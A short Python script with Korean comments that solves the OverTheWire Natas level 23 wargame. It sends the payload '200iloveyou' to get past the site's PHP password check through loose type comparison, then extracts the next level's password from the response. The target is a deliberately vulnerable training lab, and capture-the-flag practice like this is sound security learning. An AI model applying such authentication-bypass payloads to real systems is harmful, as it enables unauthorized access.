import requests
import sys
import re

boundary = "=" * 65

# 프로그램 실행 입력 예외 처리
if len(sys.argv) != 2:
  print(boundary)
  print("[-] 실행 시, 비밀번호를 인자로 주지 않았습니다. 아래와 같은 포멧으로 실행해주세요")
  print(f"    python {sys.argv[0]} natas23_password")
  print(boundary)
  sys.exit(1)
  
url = "http://natas23.natas.labs.overthewire.org/"
natas23_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas23", natas23_cred)

# 200iloveyou를 통해서 10보다 커야한다는 조건과 strstr을 통해, iloveyou가 있어야 한다는 조건을 모두 만족시킨 페이로드 생성
# 여기서 숫자는 10보다 큰 아무거나 넣어도 상관없음
payload = "200iloveyou" 
data = {"passwd": payload}

# 페이로드를 담아 요청
response = s.get(url, params=data)

# 비밀번호 정규식으로 추출
password = re.search(r"Password:\s*(\w+)", response.text)

print(boundary)
print(f"[*] 입력한 페이로드: {payload}")

# 다음 단계 비밀번호 찾아 출력 및 예외 처리
if password:
  print(f"[+] natas24의 비밀번호 ====> {password.group(1)}")
  print(boundary)
else:
  print(" [-] 아래 응답 전체 html 코드를 확인해주세요")
  print(response.text)
    
